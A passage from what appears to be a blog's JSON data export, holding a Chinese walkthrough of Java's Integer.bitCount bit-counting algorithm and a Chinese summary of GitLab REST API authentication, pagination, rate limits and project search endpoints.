方法第六行</strong></p>\n<p>前面第4步说过，为了精简代码的指令，将高位清空的任务留到所有计算完成后一并处理。在第4步和第5步中均遗留了未处理的高位数据，所以第6步将完成前面未完成的高位清空工作。第4步中已经分析过了，最终结果仅需6个二进制位即可表示，所以最后清空高26位的数据，计算过程如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000100000010100000110100010000</span><br><span class=\"line\">                ⇩</span><br><span class=\"line\">00000000000000000000000000010000</span><br></pre></td></tr></table></figure>\n\n<p>代码表示如下（0x0000003f的二进制值是0b_00000000000000000000000000111111）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i &amp; 0x0000003f;</span><br></pre></td></tr></table></figure>\n\n<p>所以最终的结果是<code>0b_10000</code>即16</p>\n<p>可以看出来，<code>Integer.bitCount</code>方法在代码所耗费的指令上已经作了极尽的优化。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>使用过Redis的人可能知道，Redis中给我们提供了统计二进制位数为1的位数量的指令<code>bitcout</code>，JDK中Integer类同样也给我们提供了该功能的方法<code>Integer.bigCount</code>，得益于此，我们很容易就能一窥该方法的实现</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static int bitCount(int i) &#123;</span><br><span class=\"line\">    // HD, Figure 5-2</span><br><span class=\"line\">    i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br><span class=\"line\">    i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);</span><br><span class=\"line\">    i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;</span><br><span class=\"line\">    i = i + (i &gt;&gt;&gt; 8);</span><br><span class=\"line\">    i = i + (i &gt;&gt;&gt; 16);</span><br><span class=\"line\">    return i &amp; 0x3f;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上述代码作为Integer类中比较有意思的一个方法，该方法利用了一个技巧：通过分割分配二进制位的方式，CPU可以实现一个指令同时计算多个数值。该方法的前四行都利用了该技巧。</p>\n<p>NOTE：CPU要通过分配字节位的方式同时计算多个数值对，需要有一定的前提：由于每个数分配的字节位的长度有限，这就要求计算结果的二进制表示不能超出分配的位数。在当前问题上，显而易见是成立的：相加的两个数的最大值所占的二进制位数只有分配的二进制位的一半，结果值需要的二进制位必然不会超过分配的二进制位数。</p>\n<h2 id=\"案例解析\"><a href=\"#案例解析\" class=\"headerlink\" title=\"案例解析\"></a>案例解析</h2><p>为了利于问题的解决，对计算二进制位1的数量这个问题，做一个等价转换：计算二进制位上每一位值的和。</p>\n<p>以数字<code>‭1823425321‬</code>为例，二进制数值为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‭0 1 1 0  1 1 0 0  1 0 1 0  1 1 1 1  0 1 0 0  0 0 1 1  0 0 1 0  1 0 0 1‬</span><br></pre></td></tr></table></figure>\n\n<p><strong>1. 方法第一行</strong></p>\n<p>将二进制的每1位都视为一个单独的数字，从左往右两个两个数字配对，形成16组二进制数相加，得到16个数值（2位二进制）。为了使结果是2位二进制数，相加前还需先给每个数前面补零。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‭0 1  1 0  1 1  0 0  1 0  1 0  1 1  1 1  0 1  0 0  0 0  1 1  0 0  1 0  1 0  0 1‬     </span><br><span class=\"line\">                                      ⇩  </span><br><span class=\"line\">00   01   01   00   01   01   01   01   00   00   00   01   00   01   01   00</span><br><span class=\"line\">                                      +</span><br><span class=\"line\">01   00   01   00   00   00   01   01   01   00   00   01   00   00   00   01</span><br><span class=\"line\">                                      ⇩</span><br><span class=\"line\">01   01   10   00   01   01   10   10   01   00   00   10   00   01   01   01</span><br></pre></td></tr></table></figure>\n\n<p>上述计算过程用代码表示如下（0x55555555的二进制值是0b_01010101010101010101010101010101）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x55555555) + ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br></pre></td></tr></table></figure>\n\n<p>公式中，<code>i &gt;&gt;&gt; 1</code>将偶数位变为了奇数位，<code>&amp; 0x55555555</code>则清空偶数位，结合起来之后<code>(i &amp; 0x55555555)</code>和<code>((i &gt;&gt;&gt; 1) &amp; 0x55555555)</code>就分别提取了奇数位和偶数位的值，分别以奇偶位为基构建了两组2位二进制数数组，两组数组相加，完成第1步计算。</p>\n<p>认真的可能就会发现，不对啊，代码里分明是减法啊。实际上，第一行代码，用了另一个公式替代：对于2位二进制数n，1的个数c可用公式<code>c = n - (n &gt;&gt;&gt; 1)</code>计算得到。这个公式也很容易证明：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假设：2位二进制n = b1 * (2 ^ 1) + b0 * (2 ^ 0)，显然b1是n的第2位数，b0是n的第1位数</span><br><span class=\"line\">那么：所证问题等价于证明 b1 + b0 = n - b1</span><br><span class=\"line\">因为</span><br><span class=\"line\">    n - b1 = b1 * (2 ^ 1) + b0 * (2 ^ 0) - b1</span><br><span class=\"line\">           = b1 * 2 + b0 - b1</span><br><span class=\"line\">           = b1 + b0</span><br><span class=\"line\">所以问题得证</span><br></pre></td></tr></table></figure>\n\n<p>新的公式的代码在计算指令上比旧的代码减少了一个指令。所以新的代码就变为了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. 方法第二行</strong></p>\n<p>将二进制数每2位视为一个单独的数字，从左往右两个两个数字配对，形成8组二进制数相加，得到8个数值（4位二进制）。同样的，为了使结果是4位二进制数，相加前还得给每个数前面补零。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01  01    10  00    01  01    10  10    01  00    00  10    00  01    01   01</span><br><span class=\"line\">                                     ⇩  </span><br><span class=\"line\">0001      0010      0001      0010      0001      0000      0000      0001</span><br><span class=\"line\">                                     +</span><br><span class=\"line\">0001      0000      0001      0010      0000      0010      0001      0001</span><br><span class=\"line\">                                     ⇩</span><br><span class=\"line\">0010      0010      0010      0100      0001      0010      0001      0010</span><br></pre></td></tr></table></figure>\n\n<p>上述计算过程用代码表示如下（0x33333333的二进制值是0b_0011001100110011001100110011‬0011）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);</span><br></pre></td></tr></table></figure>\n\n<p>同样的，公式中，通过<code>(i&gt;&gt;&gt;2) &amp; 0x33333333</code>和<code>i &amp; 0x33333333</code>将<code>i</code>分为了相加的两部分，<code>0x33333333</code>起到了清空高2位数据的作用</p>\n<p><strong>3. 方法第三行</strong></p>\n<p>将二进制数的每4位视为一个单独的数字，从左往右两个两个数字配对，形成4组二进制数相加，得到4个数值（8位二进制）。同上所述，前面补零。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0010   0010   0010   0100   0001   0010   0001   0010</span><br><span class=\"line\">                          ⇩</span><br><span class=\"line\">00000010      00000010      00000001      00000001</span><br><span class=\"line\">                          +</span><br><span class=\"line\">00000010      00000100      00000010      00000010</span><br><span class=\"line\">                          ⇩</span><br><span class=\"line\">00000100      00000110      00000011      00000011</span><br></pre></td></tr></table></figure>\n\n<p>上述计算过程用代码表示如下（0x0f0f0f0f的二进制值是0b_00001111000011110000111100001111‬）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x0f0f0f0f) + ((i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f);</span><br></pre></td></tr></table></figure>\n\n<p>在8位二进制数中，值为1的位数最大为8，仅需4个二进制位就能表示（PS：实际上，由<code>n &lt; 2 ^ (n / 2)</code>在<code>n &gt; 4</code>时均成立，可以得出：在n大于4时，n位二进制数的值为1的位数值m，只需不超过<code>n / 2</code>个二进制位即可表示）。这意味着相加后的结果值也不会超过4个二进制位，所以在计算中可以先不考虑高4位会对结果造成影响，清空高4位值的计算<code>&amp; 0x0f0f0f0f</code>可以在加法完成之后再进行，代码就可以简化成如下所示代码（比原来的代码少了一个指令）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;</span><br></pre></td></tr></table></figure>\n\n<p><strong>4. 方法第四行</strong></p>\n<p>与前面一样，每8位视为一个单独的数字数字，相加之后得到2个16位二进制数值。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000100    00000110     00000011    00000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000000000000100         0000000000000011</span><br><span class=\"line\">                      +</span><br><span class=\"line\">0000000000000110         0000000000000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000000000001010         0000000000000110</span><br></pre></td></tr></table></figure>\n\n<p>代码表示如下（0x00ff00ff的二进制值是0b_00000000111111110000000011111111)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x00ff00ff) + ((i &gt;&gt;&gt; 8) &amp; 0x00ff00ff);</span><br></pre></td></tr></table></figure>\n\n<p>同理于第3步，加法计算中也可以先不用担心高8位对结果造成的影响直接计算即可，代码优化为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i + (i &gt;&gt;&gt; 8)) &amp; 0x00ff00ff;</span><br></pre></td></tr></table></figure>\n\n<p>此外，<strong>对于32位的<code>Integer</code>，值为1的位数最大为32，也就是说最终结果仅需6个二进制位即可表示</strong>。而当前每个加数都已经达到8个二进制位，这种情况下，相加后的和的高8位的值即使不清空也不会影响最终结果的低6位的值。所以，可以<strong>将高位清空的任务留到所有计算完成后一并处理</strong>，省略<code>&amp; 0x00ff00ff</code>后代码简化为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i + (i &gt;&gt;&gt; 8);</span><br></pre></td></tr></table></figure>\n\n<p>而省略<code>&amp; 0x00ff00ff</code>后实际的计算过程是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000100    00000110     00000011    00000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000000000000100         0000011000000011</span><br><span class=\"line\">                      +</span><br><span class=\"line\">0000010000000110         0000001100000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000010000001010         0000100100000110</span><br></pre></td></tr></table></figure>\n\n<p><strong>5. 方法第五行</strong></p>\n<p>同理于第4步，计算过程如下（以第4步中理论结果值为例）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000001010         0000000000000110</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000000000000000000000000001010</span><br><span class=\"line\">                    +</span><br><span class=\"line\">00000000000000000000000000000110</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000000000000000000000000010000</span><br></pre></td></tr></table></figure>\n\n<p>代码表示如下（0x0000ffff的二进制值是0b_00000000000000001111111111111111)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x0000ffff) + ((i &gt;&gt;&gt; 16) &amp; 0x0000ffff);</span><br></pre></td></tr></table></figure>\n\n<p>同理于第4步的优化，优化后代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i + (i &gt;&gt;&gt; 16);</span><br></pre></td></tr></table></figure>\n\n<p>同第4步一样的，贴出实际的计算过程如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000010000001010         0000100100000110</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000100000010100000100100000110</span><br><span class=\"line\">                    +</span><br><span class=\"line\">00000000000000000000010000001010</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000100000010100000110100010000</span><br></pre></td></tr></table></figure>\n\n<p><strong>6. 方法第六行</strong></p>\n<p>前面第4步说过，为了精简代码的指令，将高位清空的任务留到所有计算完成后一并处理。在第4步和第5步中均遗留了未处理的高位数据，所以第6步将完成前面未完成的高位清空工作。第4步中已经分析过了，最终结果仅需6个二进制位即可表示，所以最后清空高26位的数据，计算过程如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000100000010100000110100010000</span><br><span class=\"line\">                ⇩</span><br><span class=\"line\">00000000000000000000000000010000</span><br></pre></td></tr></table></figure>\n\n<p>代码表示如下（0x0000003f的二进制值是0b_00000000000000000000000000111111）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i &amp; 0x0000003f;</span><br></pre></td></tr></table></figure>\n\n<p>所以最终的结果是<code>0b_10000</code>即16</p>\n<p>可以看出来，<code>Integer.bitCount</code>方法在代码所耗费的指令上已经作了极尽的优化。</p>\n"},{"title":"Gitlab Api","date":"2020-01-08T11:02:24.000Z","keywords":"gitlab, api","rId":"MB-20010801","_content":"\n## 认证([官网文档地址](https://docs.gitlab.com/ee/api/README.html#authentication))\n\n四种方式\n\n1. OAuth2 tokens\n2. Personal access tokens\n3. Session cookie\n4. GitLab CI job token (Specific endpoints only)\n\n### OAuth2 tokens\n\n`curl https://gitlab.example.com/api/v4/projects?access_token=OAUTH-TOKEN`\n\n或\n\n`curl --header \"Authorization: Bearer OAUTH-TOKEN\" https://gitlab.example.com/api/v4/projects`\n\n### Personal access tokens\n\n`curl https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>`\n\n或\n\n`curl --header \"Private-Token: <your_access_token>\" https://gitlab.example.com/api/v4/projects`\n\n或\n\n`curl --header \"Authorization: Bearer <your_access_token>\" https://gitlab.example.com/api/v4/projects`\n\n\n\n## 响应状态码([官网文档地址](https://docs.gitlab.com/ee/api/README.html#status-codes))\n\n成功的状态码主要会有三种，失败的情况有多种，具体官网文档查看\n\n\n|状态码|描述|\n|:-----:|:----------------------------------------------------------:|\n|`200`|对于`GET`,`PUT`或`DELETE`请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据|\n|`201`|对于`POST`请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据|\n|`204`|表示服务器成功执行了请求，但返回的响应体无内容（即无响应体部分）|\n\n\n## 分页([官网文档地址](https://docs.gitlab.com/ee/api/README.html#pagination))\n\n提供两种分页方式\n\n1. 键集分页（性能原因考虑，官网推荐这种方式）\n2. 偏移分页\n\n\n\n### 偏移分页\n\n请求参数控制分页\n\n\n|参数名| 描述|\n| :---------: | :--------------------------: |\n|`page`|页码（默认1）|\n|`per_page`|每页数量（默认20，最大100）|\n\n\n### 键集分页\n\n键集分页可以更有效地检索页面，并且与基于偏移的分页不同，运行时与集合的大小无关（翻译自官网）。\n\n请求参数控制分页\n\n\n| 参数名       | 描述                              |\n| ----------- | -------------------------------- |\n| `pagination` | `keyset` (为了允许键集分页而设定) |\n| `per_page`   | 每页数量（默认20，最大100）       |\n\n\n例（**官网文档案例**）：\n\n请求（官网文档上`--request PUT`应该是错的，实际请求应该去掉）\n\n```\ncurl --request PUT --header \"PRIVATE-TOKEN: <your_access_token>\" \"https://gitlab.example.com/api/v4/projects?pagination=keyset&per_page=50&order_by=id&sort=asc\"\n```\n\n响应信息（**官网文档案例**中响应中包含到下一页的链接）\n\n```\nHTTP/1.1 200 OK\n...\nLink: <https://gitlab.example.com/api/v4/projects?pagination=keyset&per_page=50&order_by=id&sort=asc&id_after=42>; rel=\"next\"\nStatus: 200 OK\n...\n```\n\n**按官网文档介绍**，下一页链接中包含额外的过滤器`id_after`，过滤器类型取决于`order_by`选项，当没有更多的记录时，响应头不包含`Link`字段。`rel=\"next\"`，并不是唯一的情况，还可能有`rel=\"first\"`、rel=\"last\"，`Link`字段中也可能同时存在多个`<....>; rel=\"...\"`，解码时需要注意。\n\n仅对特定的资源支持键集分页(实际上应该不止这个接口)\n\n\n| Resource                                                     | Order              |\n| ----------------------------------------------------------- | ----------------- |\n| [/api/v4/projects](https://docs.gitlab.com/ee/api/projects.html) | `order_by=id` only |\n\n\n**实际验证之后发现**，与文档描述是不一样的，响应头`Link`字段中的链接增加的参数不是`order_by`字段，而是`page=2`参数，以及增加了`/api/v4/projects`接口的其他参数，如下所示：\n\n```\nHTTP/1.1 200 OK\n...\nLink: <https://gitlab.com/api/v4/projects?membership=false&order_by=id&owned=false&page=2&pagination=keyset&per_page=50&repository_checksum_failed=false&simple=false&sort=asc&starred=false&statistics=false&wiki_checksum_failed=false&with_custom_attributes=false&with_issues_enabled=false&with_merge_requests_enabled=false>; rel=\"next\", <https://gitlab.com/api/v4/projects?membership=false&order_by=id&owned=false&page=1&pagination=keyset&per_page=50&repository_checksum_failed=false&simple=false&sort=asc&starred=false&statistics=false&wiki_checksum_failed=false&with_custom_attributes=false&with_issues_enabled=false&with_merge_requests_enabled=false>; rel=\"first\"\n...\n```\n\n可能是官网文档较长时间没更新了吧\n\n\n\n### 分页响应头\n\n分页响应头中包含下面字段\n\n\n| 响应头          | 描述                                                         |\n| -------------- | ----------------------------------------------------------- |\n| `X-Total`       | 结果总数量（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多） |\n| `X-Total-Pages` | 结果总页数（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多） |\n| `X-Per-Page`    | 每页多少条                                                   |\n| `X-Page`        | 当期所在页                                                   |\n| `X-Next-Page`   | 下一页                                                       |\n| `X-Prev-Page`   | 前一页                                                       |\n\n\n分页这里还是有不少坑的，实际表现与官方文档描述诸多不符\n\n键集分页响应头中另外还包含如下字段\n\n\n| 响应头 | 描述                                                         |\n| ----- | ----------------------------------------------------------- |\n| `Link` | 可能包含下一页的请求地址、上一页的请求地址、第一页的请求地址、最后一页的请求地址。仅仅是可能包含，不一定包含，比如，当结果总条数特别多时，就不会包含最后一页的请求地址（可能是性能原因考虑，gitlab服务器上实际上没有查询完所有结果就响应了）；当页面位于第一页时，不会包含上一页的请求地址。 |\n\n\n\n## 频率限制([官网文档地址](https://docs.gitlab.com/ee/security/rate_limits.html))\n\n实际上频率限制这一块文档，基本是面向2B客户（即在自己服务器上部署gitlab的客户）的，API查询从官网文档中得不到多少信息。`Rack Attach`章节，可能会有些许借鉴意义，它旨在限制来自大量请求的IP地址的请求。\n\n### Rack Attach\n\nAPI查询的请求头中返回的字段会包含如下几个([此处官网链接](https://docs.gitlab.com/ee/user/gitlab_com/index.html#haproxy-api-throttle))：\n\n```\nRateLimit-Limit: 600\nRateLimit-Observed: 6\nRateLimit-Remaining: 594\nRateLimit-Reset: 1563325137\nRateLimit-ResetTime: Wed, 17 Jul 2019 00:58:57 GMT\n```\n\n其中`RateLimit-Remaining`表示到重置时间`RateLimit-Reset`为止，能进行多少次请求\n\n对于某些受保护的接口，每分钟超过10次的情况下，会触发code `429`，并且响应头中会包含如下信息。表明当前IP被服务器限制请求，可在60秒后重新发起请求\n\n```\nRetry-After: 60\n```\n\n\n\n默认情况下，受保护的接口有\n\n```\ndefault['gitlab']['gitlab-rails']['rack_attack_protected_paths'] = [\n  '/users/password',\n  '/users/sign_in',\n  '/api/#{API::API.version}/session.json',\n  '/api/#{API::API.version}/session',\n  '/users',\n  '/users/confirmation',\n  '/unsubscribes/',\n  '/import/github/personal_access_token',\n  '/admin/session'\n]\n```\n\n\n\n### 设置项目的请求频率\n\n这一块与API请求无关，是2B客户设置请求频率相关的内容，可以在[User and IP rate limits](https://docs.gitlab.com/ee/user/admin_area/settings/user_and_ip_rate_limits.html)和[Rate limits on raw endpoints](https://docs.gitlab.com/ee/user/admin_area/settings/rate_limits_on_raw_endpoints.html)章节中查看\n\n\n\n## 查询相关接口[官网文档地址](https://docs.gitlab.com/ee/api/README.html#status-codes)\n\n### search接口\n\n全局（不限项目project/不限组织group）search接口路径\n\n```\n/api/v4/search\n```\n\n参数\n\n\n| 参数     | 描述         |\n| ------- | ----------- |\n| `scope`  | 搜索范围     |\n| `search` | 搜索的字符串 |\n\n\nscope取值\n\n\n| 取值 | 描述 |\n| ---- | ---- |\n| projects | 从项目名称和项目描述中搜索 |\n| merge_requests | 从merge记录搜索 |\n| issues | 从issue搜索 |\n| milestones | 从发布的里程碑版本搜索 |\n| snippet_titles | 从代码片（与项目没有关系，是另一种与项目同级别的产品）标题搜索 |\n| snippet_blobs | 从代码片的内容搜索 |\n| wiki_blobs | 从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用），在官网描述中看不出wiki_blobs与blobs有何区别 |\n| commits | 从commit中搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用） |\n| blobs | 从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用） |\n| users | 从用户名搜索 |\n\n\n### projects接口\n\n接口路径\n\n```\n/api/v4/projects\n```\n\n参数\n\n\n| 参数                          | 类型    | 是否必传 | 描述                                                         |\n| ---------------------------- | ------ | ------- | ----------------------------------------------------------- |\n| `archived`                    | boolean | no       | 过滤打包状态                                                 |\n| `visibility`                  | string  | no       | 过滤可见范围 `public`, `internal`, `private`                 |\n| `order_by`                    | string  | no       | 排序依据字段，可以为`id`, `name`, `path`, `created_at`, `updated_at`, `last_activity_at` 字段，默认是 `created_at` |\n| `sort`                        | string  | no       | 排序，`asc` / `desc` ，默认是 `desc`                         |\n| `search`                      | string  | no       | 搜索字符串                                                   |\n| `simple`                      | boolean | no       | true时，只返回少量简单字段                                   |\n| `owned`                       | boolean | no       | 过滤，仅当前用户拥有的项目                                   |\n| `membership`                  | boolean | no       | 过滤，仅当前用户所属的项目                                   |\n| `starred`                     | boolean | no       | 过滤，仅当前用户加星的项目                                   |\n| `statistics`                  | boolean | no       | 包括项目统计                                                 |\n| `with_custom_attributes`      | boolean | no       | 过滤，包含[自定义属性 custom_attributes](https://docs.gitlab.com/ee/api/custom_attributes.html)设置（仅管理员） |\n| `with_issues_enabled`         | boolean | no       | 过滤，根据issues_enabled值                                   |\n| `with_merge_requests_enabled` | boolean | no       | 过滤，根据merge_requests_enabled值                           |\n| `with_programming_language`   | string  | no       | 过滤，按编程语言过滤                                         |\n| `wiki_checksum_failed`        | boolean | no       | wiki校验值计算失败的项目([GitLab Premium](https://about.gitlab.com/pricing/) 11.2中的[介绍](https://gitlab.com/gitlab-org/gitlab/merge_requests/6137)) |\n| `repository_checksum_failed`  | boolean | no       | repository校验值计算失败的项目([GitLab Premium](https://about.gitlab.com/pricing/) 11.2中的[介绍](https://gitlab.com/gitlab-org/gitlab/merge_requests/6137)) |\n| `min_access_level`            | integer | no       | 过滤，仅当前用户的 [最低访问权限级别](https://docs.gitlab.com/ee/api/members.html) |\n| `id_after`                    | integer | no       | 过滤，限制为ID大于指定ID的项目                               |\n| `id_before`                   | integer | no       | 过滤，限制为ID小于指定ID的项目                               |\n\n\n返回值中有两个需要注意的参数`repository_access_level`和`visibility`，只有`repository_access_level`参数值为`enabled`且`visibility`参数值为`public`时才可以clone该仓库\n\n\n\n该接口，经身份验证的用户和未经身份验证的用户均可使用，但未经身份验证的用户响应内容中的信息会更少，与`simple=true`的时候相同。\n\n当请求中包含自定义属性时，请求url传参如下所示\n\n```\nGET /api/v4/projects?custom_attributes[key]=value&custom_attributes[other_key]=other_value\n```\n\n\n\n\n\n阅读文档后，没怎么弄懂上面`/api/v4/projects`和`/api/v4/search?scope=projects`这两个接口有什么重要的区别，姑且认为它们是可以相互取代的，使用任意一个皆可。\n\n\n","source":"_posts/2020-01-08_gitlab_api.md","raw":"---\ntitle: Gitlab Api\ndate: 2020-01-08 19:02:24\ntags: api\npermalink: gitlab-api\nkeywords: gitlab, api\nrId: MB-20010801\n---\n\n## 认证([官网文档地址](https://docs.gitlab.com/ee/api/README.html#authentication))\n\n四种方式\n\n1. OAuth2 tokens\n2. Personal access tokens\n3. Session cookie\n4. GitLab CI job token (Specific endpoints only)\n\n### OAuth2 tokens\n\n`curl https://gitlab.example.com/api/v4/projects?access_token=OAUTH-TOKEN`\n\n或\n\n`curl --header \"Authorization: Bearer OAUTH-TOKEN\" https://gitlab.example.com/api/v4/projects`\n\n### Personal access tokens\n\n`curl https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>`\n\n或\n\n`curl --header \"Private-Token: <your_access_token>\" https://gitlab.example.com/api/v4/projects`\n\n或\n\n`curl --header \"Authorization: Bearer <your_access_token>\" https://gitlab.example.com/api/v4/projects`\n\n\n\n## 响应状态码([官网文档地址](https://docs.gitlab.com/ee/api/README.html#status-codes))\n\n成功的状态码主要会有三种，失败的情况有多种，具体官网文档查看\n\n\n|状态码|描述|\n|:-----:|:----------------------------------------------------------:|\n|`200`|对于`GET`,`PUT`或`DELETE`请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据|\n|`201`|对于`POST`请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据|\n|`204`|表示服务器成功执行了请求，但返回的响应体无内容（即无响应体部分）|\n\n\n## 分页([官网文档地址](https://docs.gitlab.com/ee/api/README.html#pagination))\n\n提供两种分页方式\n\n1. 键集分页（性能原因考虑，官网推荐这种方式）\n2. 偏移分页\n\n\n\n### 偏移分页\n\n请求参数控制分页\n\n\n|参数名| 描述|\n| :---------: | :--------------------------: |\n|`page`|页码（默认1）|\n|`per_page`|每页数量（默认20，最大100）|\n\n\n### 键集分页\n\n键集分页可以更有效地检索页面，并且与基于偏移的分页不同，运行时与集合的大小无关（翻译自官网）。\n\n请求参数控制分页\n\n\n| 参数名       | 描述                              |\n| ----------- | -------------------------------- |\n| `pagination` | `keyset` (为了允许键集分页而设定) |\n| `per_page`   | 每页数量（默认20，最大100）       |\n\n\n例（**官网文档案例**）：\n\n请求（官网文档上`--request PUT`应该是错的，实际请求应该去掉）\n\n```\ncurl --request PUT --header \"PRIVATE-TOKEN: <your_access_token>\" 